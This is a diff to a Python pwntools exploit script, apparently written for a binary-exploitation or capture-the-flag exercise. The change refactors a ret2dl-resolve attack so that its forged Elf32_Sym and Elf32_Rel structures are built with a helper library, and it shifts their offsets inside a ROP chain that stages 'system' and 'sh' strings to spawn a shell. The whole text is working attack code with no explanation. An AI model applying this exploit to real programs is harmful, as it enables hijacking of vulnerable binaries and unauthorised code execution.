@@ -1,5 +1,5 @@
 from pwn import *
-
+from DL_RESOLVE import *
 
 ###Utils
 def setname(data):
@@ -64,20 +64,28 @@ sys_str = b'system\x00'
 padding_len = (SYMTAB)&0xf
 
 #  Fake Elf32_Sym
+'''
+#st_name    ptr2system_str
+#st_info    unused
+#st_other   0
+#st_shnndx  unused
+#st_value   unused
+#st_size    unused
+'''
 fake_sym_addr = name_buf+0x50+padding_len
-Elf_sym  = p32(sys_str_addr-STRTAB) #st_name    ptr2system_str
-Elf_sym += p32(0)                   #st_value   unused
-Elf_sym += p32(0)                   #st_size    unused
-Elf_sym += p32(0)                   #st_info    unused
-                                    #st_other   &3=0
-                                    #st_shnndx  unused
+elf_sym = Elf_Sym(arch=32)
+Elf_sym = elf_sym.construct(st_name=sys_str_addr-STRTAB,st_other=0)
 
 #  Fake Elf32_Rel
-fake_rel_addr = name_buf+0x60+padding_len
-Elf_rel  = p32(name_buf+0x70)       #r_offset   abitrary_writable_addr
+'''
+#r_offset   abitrary_writable_addr
+#r_info     
+'''
+fake_rel_addr = name_buf+0x70+padding_len
 r_info = (fake_sym_addr-SYMTAB)//16
 r_info = (r_info<<8)|7
-Elf_rel += p32(r_info)              #r_info
+elf_rel = Elf_Rel(arch=32)
+Elf_rel = elf_rel.construct(r_offset=name_buf+0x80,r_info=r_info)
 
 #  ROPchain
 #    read into l->l_info[VERSYMIDX(DT_VERSYM)]
@@ -94,7 +102,7 @@ ROPchain += p32(sh_str_addr)
 ROPchain  = ROPchain.ljust(0x30,b'\x00')+sh_str
 ROPchain  = ROPchain.ljust(0x40,b'\x00')+sys_str
 ROPchain  = ROPchain.ljust(0x50+padding_len,b'\x00')+Elf_sym
-ROPchain  = ROPchain.ljust(0x60+padding_len,b'\x00')+Elf_rel
+ROPchain  = ROPchain.ljust(0x70+padding_len,b'\x00')+Elf_rel
 
 r.send(ROPchain)
 #    overwrite l->l_info[VERSYMIDX(DT_VERSYM)] to NULL
